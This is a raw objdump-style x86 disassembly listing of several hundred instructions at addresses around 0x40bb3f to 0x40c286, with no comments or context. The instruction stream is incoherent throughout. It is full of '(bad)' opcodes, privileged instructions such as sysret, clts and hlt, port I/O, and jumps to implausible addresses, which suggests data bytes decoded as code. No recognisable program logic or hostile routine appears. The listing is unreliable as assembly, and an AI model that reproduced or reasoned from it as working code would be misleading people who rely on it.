  40bb3f:	add    DWORD PTR [esi+0x0],esp
  40bb42:	push   ebp
  40bb43:	xor    BYTE PTR [esi+0x4d],ah
  40bb46:	dec    ebp
  40bb47:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  40bb4d:	mov    ecx,DWORD PTR [ebp-0x2ec30075]
  40bb53:	jl     0x40bade
  40bb55:	push   eax
  40bb56:	mov    esi,?
  40bb58:	rcl    bh,1
  40bb5a:	mov    DWORD PTR [esi],eax
  40bb5c:	mov    es,esi
  40bb5e:	push   ecx
  40bb5f:	ret    0x166
  40bb62:	push   ebp
  40bb63:	pop    esi
  40bb64:	leavew 
  40bb66:	inc    ebp
  40bb67:	sbb    BYTE PTR [ebp-0x76132cab],cl
  40bb6d:	in     al,dx
  40bb6e:	xchg   esp,eax
  40bb6f:	push   esi
  40bb70:	shl    al,0x66
  40bb73:	add    DWORD PTR [ebp+0x1],0x38e1008d
  40bb7a:	mov    DWORD PTR [edi],ecx
  40bb7c:	cwde   
  40bb7d:	or     cl,BYTE PTR [ecx-0x767a6600]
  40bb83:	setl   BYTE PTR [edx]
  40bb86:	inc    ebp
  40bb87:	add    BYTE PTR [edi],cl
  40bb89:	test   DWORD PTR [ebp+0xf],ecx
  40bb8c:	xor    edi,edx
  40bb8e:	add    eax,DWORD PTR [eax]
  40bb90:	xor    ecx,DWORD PTR [ebx+0x458866]
  40bb96:	mov    eax,DWORD PTR [ebp-0x1848f010]
  40bb9c:	test   al,0x0
  40bb9e:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40bba5:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  40bbab:	add    BYTE PTR [eax-0x57f076aa],ch
  40bbb1:	rol    DWORD PTR [ebp+0x0],1
  40bbb4:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40bbba:	inc    DWORD PTR [ebx-0x748a0fe8]
  40bbc0:	jmp    FWORD PTR [ebx]
  40bbc2:	adc    BYTE PTR [ebx],al
  40bbc4:	jne    0x40bbd5
  40bbc6:	call   DWORD PTR [eax-0x14]
  40bbc9:	mov    DWORD PTR [edi-0x1c],edi
  40bbcc:	push   DWORD PTR [edi-0x35e3f1ff]
  40bbd2:	inc    ebp
  40bbd3:	test   BYTE PTR [ebx-0x47ffe400],cl
  40bbd9:	dec    eax
  40bbda:	add    DWORD PTR [ebx+0x0],edx
  40bbdd:	dec    ebp
  40bbde:	inc    ebp
  40bbdf:	mov    esi,0x7f8cff8b
  40bbe4:	add    BYTE PTR [ebp-0x74728b75],al
  40bbea:	add    al,0x83
  40bbec:	adc    esp,esi
  40bbee:	(bad)  
  40bbef:	and    edx,DWORD PTR ds:0x780f0703
  40bbf5:	jp     0x40bb82
  40bbf7:	sysret 
  40bbf9:	pop    edx
  40bbfa:	add    eax,DWORD PTR [ebx]
  40bbfc:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  40bc00:	sub    edx,DWORD PTR [ebx+eax*1]
  40bc03:	dec    ebp
  40bc04:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  40bc0a:	ret    0x83
  40bc0d:	clc    
  40bc0e:	mov    esp,DWORD PTR [ebx]
  40bc10:	add    DWORD PTR [ebx],0x1c
  40bc13:	jnp    0x90504792
  40bc19:	pop    ecx
  40bc1a:	add    BYTE PTR [ebx],al
  40bc1c:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  40bc21:	adc    al,0x1
  40bc23:	jge    0x40bc25
  40bc25:	mov    edx,edx
  40bc27:	cld    
  40bc28:	test   BYTE PTR [edi],bh
  40bc2a:	add    edi,edi
  40bc2c:	add    BYTE PTR [esi],al
  40bc2e:	neg    BYTE PTR [ebp-0x7c]
  40bc31:	add    DWORD PTR [eax],eax
  40bc33:	pop    es
  40bc34:	add    BYTE PTR [edi-0x48fff17a],dh
  40bc3a:	add    BYTE PTR [eax+eax*8],cl
  40bc3d:	inc    ebp
  40bc3e:	test   BYTE PTR [ebx+0x300fc00],al
  40bc44:	mov    esi,0xf80039
  40bc49:	fisttp DWORD PTR [edi]
  40bc4b:	mov    bh,0xda
  40bc4d:	push   cs
  40bc4e:	add    BYTE PTR [edi+0x4d340c39],dh
  40bc54:	test   bh,bh
  40bc56:	add    ah,dh
  40bc58:	add    cl,al
  40bc5a:	mov    cl,0x3
  40bc5c:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  40bc62:	add    BYTE PTR [edx-0x36],dh
  40bc65:	mov    ecx,DWORD PTR [esi]
  40bc67:	call   0xef8742e
  40bc6c:	or     al,0xb7
  40bc6e:	dec    ebp
  40bc6f:	or     al,0xf
  40bc71:	inc    ebp
  40bc72:	dec    eax
  40bc73:	add    DWORD PTR [ebx],0x8
  40bc76:	(bad)  
  40bc78:	scas   al,BYTE PTR es:[edi]
  40bc79:	dec    ebp
  40bc7a:	add    BYTE PTR [ecx],bh
  40bc7c:	(bad)  
  40bc7d:	lock adc al,0x82
  40bc80:	mov    edi,edi
  40bc82:	call   0xff9cbc86
  40bc87:	rcl    BYTE PTR [edi-0x15],0x31
  40bc8b:	xor    edi,DWORD PTR [edi+0x5e]
  40bc8e:	adc    ebx,eax
  40bc90:	mov    eax,DWORD PTR gs:[eax]
  40bc93:	mov    edx,esi
  40bc95:	nop
  40bc96:	rol    BYTE PTR [eax],1
  40bc98:	mov    bh,0x83
  40bc9a:	push   cs
  40bc9b:	or     al,0xb7
  40bc9d:	xor    ecx,DWORD PTR [esi+edx*2]
  40bca0:	sti    
  40bca1:	cmp    DWORD PTR [ecx+0xf],ebp
  40bca4:	dec    edx
  40bca5:	test   DWORD PTR [ecx+0x318bec00],ecx
  40bcab:	or     al,0x41
  40bcad:	ret    
  40bcae:	or     DWORD PTR [esi+0x65],edi
  40bcb1:	pop    eax
  40bcb2:	add    BYTE PTR [ebp-0x32],dh
  40bcb5:	xor    ecx,eax
  40bcb7:	inc    eax
  40bcb8:	mov    bh,0x76
  40bcba:	push   cs
  40bcbb:	inc    eax
  40bcbc:	mov    bh,0x3
  40bcbe:	or     al,0x8
  40bcc0:	sti    
  40bcc1:	dec    eax
  40bcc2:	sub    ecx,DWORD PTR [ebx+0x70892479]
  40bcc8:	cld    
  40bcc9:	mov    edi,DWORD PTR [ebp+0x18]
  40bccc:	mov    ecx,DWORD PTR [ebp-0x7b]
  40bccf:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  40bcd3:	jne    0x40bcb9
  40bcd5:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bcd8:	jns    0xff50b957
  40bcde:	pop    ecx
  40bcdf:	jge    0x40bce0
  40bce1:	cmp    eax,edi
  40bce3:	cld    
  40bce4:	inc    ebp
  40bce5:	iret   
  40bce6:	or     BYTE PTR [eax-0x5],bh
  40bce9:	jae    0x40bd68
  40bceb:	(bad)  
  40bced:	xor    al,0xf
  40bcef:	jmp    0x40bd6b
  40bcf1:	mov    ecx,DWORD PTR [edi]
  40bcf3:	lea    ebx,[edx-0x4f]
  40bcf6:	mov    esi,DWORD PTR [ebx]
  40bcf8:	in     al,dx
  40bcf9:	test   BYTE PTR [ebp+0x27],0x83
  40bcfd:	jge    0x40bd07
  40bcff:	add    edi,ebx
  40bd01:	mov    DWORD PTR [ebp-0x8],ecx
  40bd04:	cmp    eax,edi
  40bd06:	hlt    
  40bd07:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  40bd0d:	jl     0x40bd5f
  40bd0f:	clc    
  40bd10:	(bad)  
  40bd12:	js     0x40bc9f
  40bd14:	push   DWORD PTR [edx-0x10]
  40bd17:	mov    eax,ecx
  40bd19:	clc    
  40bd1a:	add    edi,edi
  40bd1c:	mov    DWORD PTR [eax],edx
  40bd1e:	call   0xfbe125e
  40bd23:	inc    edi
  40bd24:	popa   
  40bd25:	jge    0x40bd26
  40bd27:	cmp    ebx,DWORD PTR [edi-0x4]
  40bd2a:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  40bd30:	rcr    BYTE PTR [esi-0x37],0xc9
  40bd34:	push   ebp
  40bd35:	or     ah,ch
  40bd37:	push   ebp
  40bd38:	sub    ah,0x1
  40bd3b:	in     al,dx
  40bd3c:	add    BYTE PTR [edx-0x7ac7a14],bh
  40bd42:	fist   DWORD PTR [ebp+0x57]
  40bd45:	(bad)  
  40bd46:	sbb    al,bh
  40bd48:	test   BYTE PTR [ebp+0x4500f800],al
  40bd4e:	inc    ebp
  40bd4f:	mov    edi,DWORD PTR [ebx]
  40bd51:	cld    
  40bd52:	je     0x40bda1
  40bd54:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  40bd5a:	ror    BYTE PTR [ebx-0x74740315],0x78
  40bd61:	adc    BYTE PTR [ebp-0x42],al
  40bd64:	mov    ecx,DWORD PTR [eax]
  40bd66:	sbb    al,0x7
  40bd68:	push   eax
  40bd69:	inc    ebp
  40bd6a:	mov    ecx,DWORD PTR [edi-0x7487adec]
  40bd70:	add    edi,esp
  40bd72:	or     BYTE PTR [ebx+0x890155],bl
  40bd78:	cld    
  40bd79:	mov    edi,0x372f7
  40bd7e:	jge    0x40bd4e
  40bd80:	xor    eax,esi
  40bd82:	mov    edi,eax
  40bd84:	hlt    
  40bd85:	iret   
  40bd86:	pop    ebp
  40bd87:	inc    ebp
  40bd88:	jbe    0x40bdc5
  40bd8a:	cmp    ecx,DWORD PTR [edi]
  40bd8c:	adc    al,0x7b
  40bd8e:	push   es
  40bd8f:	add    BYTE PTR [edi+0x2fc7a8b],dh
  40bd95:	dec    ebp
  40bd96:	div    DWORD PTR [ebx]
  40bd98:	sbb    al,0x3
  40bd9a:	mov    edi,DWORD PTR [ebx]
  40bd9c:	test   DWORD PTR [edi],ecx
  40bd9e:	je     0x40be09
  40bda0:	mov    eax,DWORD PTR [eax]
  40bda2:	or     BYTE PTR [ebx-0x76820302],cl
  40bda8:	cmp    eax,DWORD PTR [eax]
  40bdaa:	jbe    0x40bdac
  40bdac:	mov    ebx,esi
  40bdae:	or     al,0xdf
  40bdb0:	jg     0x40bd7d
  40bdb2:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  40bdb9:	dec    ebp
  40bdba:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  40bdc0:	je     0x40bda0
  40bdc2:	mov    edi,ebx
  40bdc4:	mov    ebx,DWORD PTR [ebp-0xc]
  40bdc7:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  40bdcd:	adc    dh,BYTE PTR [edx+0x55]
  40bdd0:	jmp    0x40bd5d
  40bdd2:	xor    edi,esp
  40bdd4:	pop    edi
  40bdd5:	rcr    BYTE PTR [ebx+0x33],cl
  40bdd8:	ret    0x3
  40bddb:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  40bde1:	push   ebp
  40bde2:	xor    eax,0x89fc9c8b
  40bde7:	sar    ah,cl
  40bde9:	xor    eax,DWORD PTR [ebp+0x3]
  40bdec:	xor    al,0x39
  40bdee:	pushf  
  40bdef:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  40bdf5:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  40bdfb:	pop    ebp
  40bdfc:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  40be02:	push   ebx
  40be03:	add    ebx,DWORD PTR [ebp-0x75]
  40be06:	push   esi
  40be07:	adc    BYTE PTR [edi+0x4d],dl
  40be0a:	push   ecx
  40be0b:	xor    eax,edi
  40be0d:	mov    eax,esi
  40be0f:	in     al,0xeb
  40be11:	dec    ebp
  40be12:	add    ecx,DWORD PTR [ebx-0x317403b3]
  40be18:	nop
  40be19:	iret   
  40be1a:	add    dh,dl
  40be1c:	push   edi
  40be1d:	dec    ebp
  40be1e:	sahf   
  40be1f:	mov    esi,DWORD PTR [edx]
  40be21:	add    esi,DWORD PTR [ebx]
  40be23:	add    esi,DWORD PTR [ebx]
  40be25:	cmp    eax,DWORD PTR [ebx]
  40be27:	je     0x40be2c
  40be29:	add    ecx,DWORD PTR [ecx+0xb4de808]
  40be2f:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  40be36:	pop    ebp
  40be37:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  40be3d:	sahf   
  40be3e:	fbstp  TBYTE PTR [edx]
  40be40:	(bad)  [ecx+0x45020c84]
  40be46:	add    BYTE PTR [eax],dh
  40be48:	pop    ebp
  40be49:	pushf  
  40be4a:	mov    ecx,DWORD PTR [ebx+0x75001080]
  40be50:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  40be56:	ud0    ecx,DWORD PTR [edi-0x75]
  40be5a:	add    ah,bh
  40be5c:	add    ecx,esi
  40be5e:	or     bh,cl
  40be60:	dec    ebp
  40be61:	inc    ebp
  40be62:	mov    edi,DWORD PTR [ebx]
  40be64:	xor    esi,DWORD PTR [ebp+0x3]
  40be67:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  40be6d:	mov    edi,DWORD PTR [ebx]
  40be6f:	fdiv   DWORD PTR [eax+eax*1-0x75]
  40be73:	push   eax
  40be75:	or     al,0x5d
  40be77:	inc    ebp
  40be78:	imul   eax,edi,0x14
  40be7b:	loopne 0x40be5b
  40be7d:	sbb    ebx,edi
  40be7f:	jg     0x40be9d
  40be81:	inc    ebp
  40be82:	jne    0x40bea0
  40be84:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  40be8b:	(bad)  
  40be8c:	adc    al,0xc7
  40be8e:	fiadd  WORD PTR [ebp-0x21]
  40be91:	jne    0x40beef
  40be93:	mov    edx,DWORD PTR [eax]
  40be95:	clc    
  40be96:	test   BYTE PTR [ebp+0x2],cl
  40be99:	xor    eax,DWORD PTR [eax]
  40be9b:	xor    eax,DWORD PTR [ebp-0x73]
  40be9e:	mov    eax,DWORD PTR [ebx]
  40bea0:	cld    
  40bea1:	jb     0x40bee8
  40bea3:	add    BYTE PTR [ebx+0x45],ch
  40bea6:	adc    al,0x8b
  40bea8:	rcr    eax,0x48
  40beab:	add    BYTE PTR [ebx],al
  40bead:	add    ecx,DWORD PTR [eax]
  40beaf:	pmaxub mm1,mm3
  40beb2:	dec    ebp
  40beb3:	dec    DWORD PTR [ebx+0x5545fc24]
  40beb9:	xor    esi,DWORD PTR [ebx]
  40bebb:	add    eax,DWORD PTR [ebx]
  40bebd:	cmp    esi,DWORD PTR [ebx]
  40bebf:	hlt    
  40bec0:	mov    DWORD PTR [edi],ecx
  40bec2:	fadd   QWORD PTR [ebp+0x8]
  40bec5:	xor    edx,edi
  40bec7:	add    ebx,edi
  40bec9:	cmp    ecx,edx
  40becb:	clts   
  40becd:	jp     0x40bf1c
  40becf:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  40bed5:	(bad)  
  40bed6:	xor    eax,edi
  40bed8:	add    eax,DWORD PTR [ebp+0xc]
  40bedb:	jne    0x40bf22
  40bedd:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  40bee3:	xor    eax,DWORD PTR [eax]
  40bee5:	lea    eax,[ebp+0x1]
  40bee8:	(bad)  
  40bee9:	jb     0x40bec3
  40beeb:	add    BYTE PTR [ebp+0x45e9f845],al
  40bef1:	add    bh,bh
  40bef3:	add    BYTE PTR [eax*2+0x12018d80],cl
  40befa:	add    bh,al
  40befc:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  40bf03:	pop    ebp
  40bf04:	mov    DWORD PTR [ebx],esi
  40bf06:	hlt    
  40bf07:	add    ecx,eax
  40bf09:	jmp    0x85bf20
  40bf0e:	inc    DWORD PTR [ebp+0xc]
  40bf11:	xor    eax,DWORD PTR [eax+0x890103]
  40bf17:	in     al,dx
  40bf18:	push   eax
  40bf19:	inc    ebp
  40bf1a:	mov    DWORD PTR [ebx],esi
  40bf1c:	hlt    
  40bf1d:	add    eax,DWORD PTR [ebp-0x77]
  40bf20:	mov    WORD PTR [esi+eiz*2],cs
  40bf23:	dec    ebp
  40bf24:	(bad)  
  40bf25:	mov    esp,eax
  40bf27:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  40bf2d:	enter  0x633,0x3
  40bf31:	add    al,0x3b
  40bf33:	mov    esp,esi
  40bf35:	in     al,dx
  40bf36:	and    eax,DWORD PTR [ebp+0x45]
  40bf39:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  40bf3f:	mov    ecx,esi
  40bf41:	cld    
  40bf42:	pushf  
  40bf43:	dec    ebp
  40bf44:	sahf   
  40bf45:	xor    esi,DWORD PTR [edx]
  40bf47:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  40bf4d:	mov    eax,DWORD PTR [ecx]
  40bf4f:	cld    
  40bf50:	add    BYTE PTR [ebp-0x31],cl
  40bf53:	xor    ebp,DWORD PTR [edi+0x50c15103]
  40bf59:	pop    ds
  40bf5a:	mov    eax,ecx
  40bf5c:	cld    
  40bf5d:	sbb    dh,al
  40bf5f:	dec    ebp
  40bf60:	(bad)  
  40bf61:	mov    eax,DWORD PTR [ebp+0x10]
  40bf64:	jne    0x40bee6
  40bf66:	mov    eax,DWORD PTR [ecx]
  40bf68:	fadd   DWORD PTR [eax]
  40bf6a:	(bad)  
  40bf6b:	mov    bh,0xc7
  40bf6d:	push   ecx
  40bf6e:	fdiv   DWORD PTR [ebp-0x7a]
  40bf71:	(bad)  
  40bf72:	dec    DWORD PTR [eax]
  40bf74:	call   FWORD PTR [ecx]
  40bf76:	inc    ebp
  40bf77:	inc    ebp
  40bf78:	xor    eax,DWORD PTR [ebx]
  40bf7a:	add    ecx,DWORD PTR [eax]
  40bf7c:	cmp    ecx,DWORD PTR [ebp-0xc]
  40bf7f:	mov    edx,DWORD PTR [edi]
  40bf81:	fadd   DWORD PTR [ebp+0x0]
  40bf84:	mov    eax,DWORD PTR [ebx-0x39fd18]
  40bf8a:	test   ah,dh
  40bf8c:	sahf   
  40bf8d:	push   ecx
  40bf8e:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  40bf94:	out    dx,eax
  40bf95:	mov    eax,DWORD PTR [eax]
  40bf97:	or     al,0xc7
  40bf99:	(bad)  
  40bf9a:	in     al,dx
  40bf9b:	(bad)  
  40bf9c:	sbb    eax,ecx
  40bf9e:	add    DWORD PTR [ebp+0x45],eax
  40bfa1:	jne    0x40bf32
  40bfa3:	mov    eax,DWORD PTR [eax+ebp*8]
  40bfa6:	mov    eax,esi
  40bfa8:	cld    
  40bfa9:	test   dh,bl
  40bfab:	sahf   
  40bfac:	fbstp  TBYTE PTR [edx]
  40bfae:	ret    0x89
  40bfb1:	call   0x4e3cd041
  40bfb6:	(bad)  
  40bfb7:	xor    eax,edi
  40bfb9:	add    eax,DWORD PTR [ebp+0xf]
  40bfbc:	mov    eax,ecx
  40bfbe:	cld    
  40bfbf:	dec    ebp
  40bfc0:	(bad)  
  40bfc1:	mov    edi,eax
  40bfc3:	cdq    
  40bfc4:	inc    ebp
  40bfc5:	inc    ebp
  40bfc6:	mov    esi,DWORD PTR [ebx]
  40bfc8:	cld    
  40bfc9:	lea    eax,[ebp+0x3]
  40bfcc:	xor    esi,DWORD PTR [edx+0x3]
  40bfcf:	add    BYTE PTR [ebx],bh
  40bfd1:	inc    ebp
  40bfd2:	je     0x40bf5f
  40bfd4:	mov    esp,esp
  40bfd6:	cwde   
  40bfd7:	mov    BYTE PTR [ebp-0x39],0x8b
  40bfdb:	add    al,0xe4
  40bfdd:	(bad)  
  40bfdf:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  40bfe5:	lock mov eax,DWORD PTR [ebp-0x14]
  40bfe9:	mov    eax,esi
  40bfeb:	aam    0xc7
  40bfed:	jmp    0xd645:0x2972c1
  40bff4:	mov    eax,ebp
  40bff6:	in     al,dx
  40bff7:	inc    esi
  40bff9:	mov    eax,edi
  40bffb:	cld    
  40bffc:	jmp    0x750ffbcf
  40c001:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  40c008:	mov    edi,eax
  40c00a:	fadd   DWORD PTR [ebx]
  40c00c:	add    BYTE PTR [ebp+0xf],al
  40c00f:	xor    ecx,ecx
  40c011:	add    edi,edi
  40c013:	pop    edi
  40c014:	hlt    
  40c015:	pop    ebx
  40c016:	push   eax
  40c017:	ret    0xeb
  40c01a:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  40c020:	mov    eax,DWORD PTR [ebp+0x10]
  40c023:	xor    eax,0xc7019c89
  40c028:	add    al,bl
  40c02a:	rol    BYTE PTR [ebp+0x4575f850],0xff
  40c031:	mov    DWORD PTR [eax],ecx
  40c033:	or     al,0x45
  40c035:	inc    ebp
  40c036:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  40c03c:	xor    eax,ecx
  40c03e:	add    ebx,DWORD PTR [esi+0x568b323b]
  40c044:	clc    
  40c045:	jne    0x40c058
  40c047:	add    ecx,DWORD PTR [ebp+0x3b]
  40c04a:	xor    ecx,DWORD PTR [edi]
  40c04c:	lea    esp,[ecx]
  40c04e:	add    DWORD PTR [eax],eax
  40c050:	jb     0x40bfdd
  40c052:	add    BYTE PTR [eax],cl
  40c054:	inc    ebp
  40c055:	jne    0x40c042
  40c057:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  40c05d:	or     al,0xc7
  40c05f:	inc    ebp
  40c060:	scas   eax,DWORD PTR es:[edi]
  40c061:	xor    BYTE PTR [ebx+0x48be49c],cl
  40c067:	in     al,0x8b
  40c069:	jne    0x40c063
  40c06b:	mov    eax,esi
  40c06d:	or     al,0x9c
  40c06f:	icebp  
  40c070:	sahf   
  40c071:	shl    DWORD PTR [edx],0xf2
  40c074:	mov    esi,DWORD PTR [esp+edi*8+0x33934d68]
  40c07b:	lsl    ebp,bx
  40c07e:	cmp    DWORD PTR [eax],eax
  40c080:	cdq    
  40c081:	mov    eax,DWORD PTR [ebp-0xba00f4]
  40c087:	add    edx,DWORD PTR [ebp-0x60]
  40c08a:	mov    eax,DWORD PTR [eax]
  40c08c:	call   0x81490e1c
  40c091:	jge    0x40c030
  40c093:	sub    esi,DWORD PTR [edx]
  40c095:	xor    al,0x33
  40c097:	jge    0x40c082
  40c099:	xor    edi,ebp
  40c09b:	add    edi,edi
  40c09d:	mov    DWORD PTR [ebp-0x24],ecx
  40c0a0:	xor    esi,edi
  40c0a2:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  40c0a9:	jne    0x40c0b3
  40c0ab:	xor    eax,DWORD PTR [ebp+0x3]
  40c0ae:	jmp    0x40c039
  40c0b0:	mov    edi,eax
  40c0b2:	cld    
  40c0b3:	mov    esi,0x5e85c7f0
  40c0b9:	clc    
  40c0ba:	leave  
  40c0bb:	xchg   edi,eax
  40c0bc:	or     al,0x0
  40c0be:	push   ebp
  40c0bf:	mov    ebp,esp
  40c0c1:	cld    
  40c0c2:	in     al,dx
  40c0c3:	icebp  
  40c0c4:	(bad)  
  40c0c5:	jnp    0x40c0c3
  40c0c7:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  40c0cd:	jae    0x40c103
  40c0cf:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  40c0d6:	inc    ebp
  40c0d7:	call   0x823d7867
  40c0dc:	push   edi
  40c0dd:	call   DWORD PTR [ecx+0x0]
  40c0e0:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  40c0e6:	add    BYTE PTR [ebx+0x3082b8b],cl
  40c0ec:	ret    0xf00f
  40c0ef:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  40c0f6:	inc    ebp
  40c0f7:	loopne 0x40c084
  40c0f9:	jne    0x40c103
  40c0fb:	mov    esi,DWORD PTR [eax-0x20]
  40c0fe:	push   edi
  40c0ff:	jge    0x40c176
  40c101:	xor    eax,edi
  40c103:	(bad)  
  40c104:	in     al,0x3e
  40c106:	test   DWORD PTR [edx-0x8],esi
  40c109:	add    BYTE PTR [ebp+0x75],al
  40c10c:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  40c112:	xor    esi,DWORD PTR [ebx]
  40c114:	xor    eax,DWORD PTR [ebx]
  40c116:	add    edi,DWORD PTR [ebx]
  40c118:	cmp    DWORD PTR [ebp-0x39],esi
  40c11b:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  40c121:	xor    eax,DWORD PTR [eax]
  40c123:	add    eax,DWORD PTR [eax]
  40c125:	cmp    esi,DWORD PTR [ebp+0x75]
  40c128:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  40c12e:	add    BYTE PTR [ecx],al
  40c130:	add    BYTE PTR [ebx+0x4d8b0275],al
  40c136:	or     al,0x75
  40c138:	ja     0x40c0c5
  40c13a:	mov    esi,esp
  40c13c:	cld    
  40c13d:	pop    ebp
  40c13e:	stc    
  40c13f:	mov    edi,edx
  40c141:	in     al,0x75
  40c143:	jge    0x40c180
  40c145:	mov    ecx,DWORD PTR [edi]
  40c147:	or     al,0xc4
  40c149:	icebp  
  40c14a:	add    BYTE PTR [ebx+ecx*4-0xe6c0394],bh
  40c151:	jae    0x40c145
  40c153:	add    esi,DWORD PTR [ebp-0xc]
  40c156:	push   ebx
  40c157:	jne    0x40c19e
  40c159:	mov    esi,DWORD PTR [edx]
  40c15b:	add    al,0x9c
  40c15d:	icebp  
  40c15e:	jmp    0x9dc255
  40c163:	cmp    esi,DWORD PTR [ebp+0xf]
  40c166:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  40c16a:	clc    
  40c16b:	pop    ebx
  40c16c:	repnz inc ebp
  40c16e:	out    dx,eax
  40c16f:	pop    edi
  40c170:	test   DWORD PTR [ebx],0x33fe456d
  40c176:	pop    esp
  40c177:	add    ecx,DWORD PTR [eax]
  40c179:	pop    esi
  40c17a:	jge    0x40c13e
  40c17c:	(bad)  
  40c17e:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  40c184:	add    BYTE PTR [ebp+0x75],al
  40c187:	xor    eax,0xc7ec9c8b
  40c18c:	xor    ah,bl
  40c18e:	repnz test esi,edi
  40c191:	clc    
  40c192:	mov    bh,0x45
  40c194:	rcl    DWORD PTR [ebx+0xc],0xbe
  40c198:	stc    
  40c199:	or     BYTE PTR [ebp+0x7],bh
  40c19c:	mov    esi,eax
  40c19e:	in     al,dx
  40c19f:	sahf   
  40c1a0:	jne    0x40c1d4
  40c1a2:	mov    eax,DWORD PTR [ebx]
  40c1a4:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  40c1aa:	sahf   
  40c1ab:	xor    esi,DWORD PTR [edx]
  40c1ad:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  40c1b3:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  40c1b9:	mov    esi,edx
  40c1bb:	lock inc cl
  40c1be:	push   ss
  40c1bf:	inc    ebp
  40c1c0:	jne    0x40c143
  40c1c2:	mov    esi,eax
  40c1c4:	in     al,dx
  40c1c5:	mov    ch,0xf1
  40c1c7:	clc    
  40c1c8:	repnz inc ebp
  40c1ca:	dec    BYTE PTR [ebx-0x3e8a07f8]
  40c1d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c1d3:	cmp    DWORD PTR [esi],0xff85c3f8
  40c1d9:	clc    
  40c1da:	call   0x5dcc6124
  40c1df:	hlt    
  40c1e0:	add    ecx,eax
  40c1e2:	clc    
  40c1e3:	inc    ebp
  40c1e4:	jne    0x40c167
  40c1e6:	mov    esi,esp
  40c1e8:	clc    
  40c1e9:	test   DWORD PTR [ebp-0x8],ebx
  40c1ec:	xor    eax,DWORD PTR [ebp+0x3b]
  40c1ef:	mov    esi,ebx
  40c1f1:	in     al,dx
  40c1f2:	xchg   ebp,eax
  40c1f3:	rol    DWORD PTR [ecx],0x45
  40c1f6:	sbb    BYTE PTR [ecx+0x58bec45],al
  40c1fc:	cld    
  40c1fd:	clc    
  40c1fe:	pop    eax
  40c1ff:	pop    es
  40c200:	xor    eax,DWORD PTR [eax]
  40c202:	add    esp,DWORD PTR [esi-0x77]
  40c205:	inc    ebp
  40c206:	hlt    
  40c207:	mov    ebx,esi
  40c209:	or     BYTE PTR [ebp-0x7b0040],al
  40c20f:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  40c215:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  40c21b:	add    dl,al
  40c21d:	mov    ecx,ecx
  40c21f:	sbb    BYTE PTR [eax],cl
  40c221:	rcl    BYTE PTR [ebp-0x7c],0xec
  40c225:	add    ebp,esp
  40c227:	add    bh,al
  40c229:	mov    edi,esp
  40c22b:	and    BYTE PTR [ebp+0x4500f842],al
  40c231:	data16 xor al,0xc1
  40c234:	pushf  
  40c235:	or     BYTE PTR [ebx+0x5666fc00],cl
  40c23b:	rcl    DWORD PTR [edi+0x4d],0x51
  40c23f:	xor    ax,WORD PTR [ecx]
  40c242:	mov    ebx,0x37285
  40c247:	add    bl,al
  40c249:	inc    ebp
  40c24a:	inc    ebp
  40c24b:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  40c251:	add    eax,ebx
  40c253:	cmp    al,0x45
  40c255:	inc    ebp
  40c256:	push   edi
  40c257:	mov    edi,DWORD PTR [ebp+0x50]
  40c25a:	mov    eax,eax
  40c25c:	lock test BYTE PTR [ebp+0x3],cl
  40c260:	xor    eax,DWORD PTR [eax]
  40c262:	mov    DWORD PTR [ebp-0x10],eax
  40c265:	xor    eax,0x8b358c45
  40c26a:	pushf  
  40c26b:	aam    0x8b
  40c26d:	xabort 0xc3
  40c270:	dec    ebp
  40c271:	inc    ebp
  40c272:	xor    ecx,DWORD PTR [ebx-0x78070377]
  40c278:	inc    ebp
  40c279:	add    ebp,esi
  40c27b:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  40c282:	dec    ebp
  40c283:	mov    esi,DWORD PTR [ebx]
  40c285:	cld    
  40c286:	mov    DWORD PTR [edi+0x4501f4],eax
